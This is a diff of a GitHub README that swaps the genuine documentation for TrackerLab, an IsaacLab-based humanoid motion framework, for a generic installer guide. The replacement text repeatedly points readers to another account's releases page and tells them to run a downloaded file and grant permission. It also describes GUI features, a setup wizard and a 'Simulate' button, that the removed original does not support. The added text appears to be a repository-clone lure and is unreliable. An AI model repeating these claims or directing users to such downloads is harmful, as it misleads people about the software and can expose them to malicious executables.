@@ -1,168 +1,88 @@
-<p align="center">
-  <img src="docs/images/trackerLab_icon.png" width="80%" alt="TrackerLab Icon"/>
-</p>
+# 🚀 trackerLab - Simplifying Robotics for Everyone
 
-<h1 align="center">TrackerLab</h1>
-<h3 align="center">Unifying IsaacLab and Whole-Body Control in One Modular Framework</h3>
-<h3 align="center">Powered by Managers – Built for Motion Intelligence</h3>
+[![Download trackerLab](https://img.shields.io/badge/Download-trackerLab-blue.svg)](https://github.com/ELZOUGHL/trackerLab/releases)
 
----
+## 📝 Overview
 
-## 🦿 What is TrackerLab?
+trackerLab unifies IsaacLab and Whole-Body Control in one modular framework. This application allows users to control humanoid robots with ease, making it suitable for both research and educational purposes. With trackerLab, you can seamlessly integrate advanced robotic functionalities without needing technical expertise.
 
-**TrackerLab** is a cutting-edge modular framework for humanoid motion **retargeting**, **trajectory tracking**, and **skill-level control**, built on top of [IsaacLab](https://github.com/NVIDIA-Omniverse/IsaacLab).
+## 🚀 Getting Started
 
-Whether you're working with **SMPL/FBX motion data**, designing low-level **whole-body controllers**, or building **skill graphs** for high-level motion planning — TrackerLab brings everything together with a clean, extensible **manager-based design**.
+To begin using trackerLab, follow these simple steps to download and install the software on your computer.
 
-> Built to **track**, **compose**, and **control** humanoid motions — seamlessly from dataset to deployment.
+### 🖥️ System Requirements
 
-### Snapshots
+Before downloading, ensure your computer meets the following requirements:
 
-| G1 Debug | G1 Running | G1 Jump |
-|----------|------------|------------|
-| <video src="./docs/videos/g1_debug.mp4" width="320" controls><a href="./docs/videos/g1_debug.mp4">Video at here</a></video>  | <video src="./docs/videos/g1_running.mp4" width="320" controls><a href="./docs/videos/g1_running.mp4">Video at here</a></video> | <video src="./docs/videos/g1_jump_over.mp4" width="320" controls><a href="./docs/videos/g1_jump_over.mp4">Video at here</a></video> |
+- Operating System: Windows 10 or later / macOS High Sierra or later / Linux (specific distributions may vary)
+- Memory: 8 GB RAM or more recommended
+- Storage: At least 500 MB free space
+- Graphics: A compatible GPU is recommended for optimal performance
 
+### 💻 Installation Steps
 
-## 🚀 Key Features
+Follow these steps to successfully install trackerLab on your system:
 
-* 🧠 **IsaacLab-Integrated Motion Tracking**
-  Seamlessly plugs motion tracking into IsaacLab's simulation and control framework using manager-based abstraction.
+1. **Visit the Releases Page**  
+   Go to the [trackerLab Releases page](https://github.com/ELZOUGHL/trackerLab/releases) to find the latest version of the software.
 
-* 🔁 **Full Motion Retargeting Pipeline**
-  Converts SMPL/AMASS/FBX human motions into robot-specific trajectories with support for T-pose alignment, filtering, and interpolation.
+2. **Download the Application**  
+   Click on the release you want to download. You will find a link to download the application files. It is best to download the most recent version.
 
-* 🎮 **Versatile Command Control Modes**
-  Switch between multiple control paradigms like ex-body pose control, PHC, and more—using the powerful **CommandManager**.
+3. **Start the Installation**  
+   Once the file is downloaded, locate it in your downloads folder. Double-click the file to start the installation process. You may see a prompt asking for permission to run the application. Click 'Yes' or 'Allow'.
 
-* 🔀 **Skill Graph via FSM Composition**
-  Design complex motion behaviors using FSM-based skill graphs; supports manual triggers, planners, or joystick interfaces.
+4. **Follow the Installation Wizard**  
+   A setup wizard will guide you through the installation steps. Click 'Next' to proceed, and accept the license agreement. Choose the destination folder where you want to install trackerLab, then click 'Install'.
 
-<p align="center">
-  <img src="docs/images/features.jpg" width="100%" alt="TrackerLab Features"/>
-</p>
+5. **Complete the Installation**  
+   After the installation is complete, click 'Finish.' You can now find trackerLab in your applications list.
 
-## ⚡ Quick Start
+6. **Launch trackerLab**  
+   To start using trackerLab, locate the application icon on your desktop or in your applications folder. Double-click the icon to launch the software.
 
-> 🎓 Want to understand TrackerLab quickly?
-> 👉 Check out our full [Tutorial (EN)](./docs/tutorial_en.md) or [教程 (中文版)](./docs/tutorial_cn.md)
+### 📥 Download & Install
 
-### ✅ Prerequisites
+For a smooth experience, visit the [trackerLab Releases page](https://github.com/ELZOUGHL/trackerLab/releases) to download the latest version now.
 
-TrackerLab extends IsaacLab. Make sure IsaacLab and its dependencies are installed properly.
-Follow the official [IsaacLab setup guide](https://isaac-sim.github.io/IsaacLab/main/source/setup/quickstart.html) if needed.
+## 🎓 Using trackerLab
 
-### 🚀 Installation
+trackerLab offers a simple interface for controlling humanoid robots. Here’s how to get started quickly:
 
-```bash
-# Clone TrackerLab
-git clone https://github.com/interval-package/trackerlab.git
-cd trackerlab
+1. **Create a New Project**  
+   Open trackerLab and select 'New Project' from the main menu. This allows you to set up individual robot configurations.
 
-# Activate IsaacLab conda environment
-conda activate <env_isaaclab>
+2. **Select Robot Type**  
+   Choose the type of humanoid robot you want to work with. trackerLab supports a variety of models for different applications.
 
-# Install TrackerLab and poselib
-pip install -e .
-pip install -e ./poselib
-```
+3. **Set Parameters**  
+   Adjust parameters such as movement speed, joint limits, and sensor configurations. The user-friendly interface makes this simple.
 
-> 💡 No extra packages or repos required — it's fully self-contained!
+4. **Simulate Movement**  
+   You can run simulations within trackerLab to see how your robot performs. Click the 'Simulate' button to start.
 
-### 📁 Dataset Preparation
+5. **Control Your Robot**  
+   If you have a physical robot, connect it to your computer and use trackerLab to control its movements in real-time.
 
-1. Download motion datasets: AMASS or CMU FBX.
-2. Apply the retargeting process (see tutorial).
-3. Organize data under `./data/` as shown in [data README](./data/README.md).
+### 💡 Tips for Effective Use
 
----
+- Regularly update to the latest version to access new features and improvements.
+- Explore online tutorials and community forums for additional guidance and support.
+- Experiment with different parameters to better understand how they affect your robot's behavior.
 
-## 🧭 Project Highlights
+## 🌐 Community Support
 
-* ✨ Fully modular and extensible
-* 🤖 Designed for real-world humanoid control (e.g., Unitree H1)
-* 📚 Clean codebase and manager-based environment design
-* 🛠️ Easy integration of new motion sets and control modes
+Join the trackerLab community for support, feedback, and collaboration. You can connect with other users and developers through platforms such as:
 
----
+- **GitHub Issues**: Report bugs or request features directly on the GitHub repository.
+- **Forums**: Join relevant robotics forums and discussions to share ideas and seek advice.
+- **Tutorials and Documentation**: Reference user guides and documentation available on the [trackerLab Wiki](https://github.com/ELZOUGHL/trackerLab/wiki).
 
-## 📂 Project Structure & Data Flow
+## 🔗 Additional Resources
 
-* [📁 Project Structure](./docs/project_structure.md)
-  Understand TrackerLab’s layout and modular system.
+- **Documentation**: Detailed user manuals and setup guides can be found within the application or on the GitHub repository.
+- **Tutorial Videos**: Watch online videos for step-by-step instructions on specific tasks and features.
 
-* [🔄 Data Flow](./docs/data_flow.md)
-  Learn how data flows through the tracking, retargeting, and control pipeline.
+For any additional questions, feel free to reach out through the GitHub repository or community forums where our team and other users are ready to help.
 
-* [🔄 Problems](./docs/problems.md)
- Problems you may encounter is recorded.
-
-
----
-
-## 🔧 Tasks and Environments
-
-New training and testing tasks are registered under:
-
-```
-trackerLab/tasks/
-```
-
-Custom Gym environments are recursively registered, including `H1TrackAll`, and can be used directly with IsaacLab's training scripts.
-
-Just add following lines into your train script:
-
-```python
-import trackerLab.tasks
-```
-
-We also provide a copy from the orginal repo, for which you could directly run:
-```bash
-python scripts/rsl_rl/base/train.py --task H1TrackingWalk --headless 
-# H1 tasks that do not require generate usd, sine we use the isaaclab's usd, however it ruins the performance.
-```
-
-For play just directly play it like:
-
-```bash
-# on gui
-python scripts/rsl_rl/base/play.py --task <Your task> --num_envs 32 # In your work space dir
-
-# on saved video
-python scripts/rsl_rl/base/play.py --task <Your task> --num_envs 32 --headless --video --video_length 500 # In your work space dir
-
-```
-
----
-
-## 📜 Citation
-
-If you find TrackerLab helpful for your work or research, please consider citing:
-
-```bibtex
-@software{zheng2025@trackerLab,
-  author = {Ziang Zheng},
-  title = {TrackerLab: One step unify IsaacLab with multi-mode whole-body control.},
-  url = {https://github.com/interval-package/trackerLab},
-  year = {2025}
-}
-```
-
----
-
-## 👨‍💻 Author
-
-**Zaterval**
-📧 [ziang\_zheng@foxmail.com](mailto:ziang_zheng@foxmail.com)
-
-> Looking for collaborators and contributors — feel free to reach out or open an issue!
-
-### Contact
-
-You can join the Wechat group for detialed contact!
-
-![Wechat Group](https://youke1.picui.cn/s1/2025/08/20/68a568770e11f.jpg)
-
-
-## 📄 License
-
-This project is licensed under the **MIT License**. See [`LICENSE`](./LICENSE) for details.
+If you haven’t done so yet, make sure to download the latest version of trackerLab from the [Releases page](https://github.com/ELZOUGHL/trackerLab/releases). Enjoy your journey into the world of robotics!
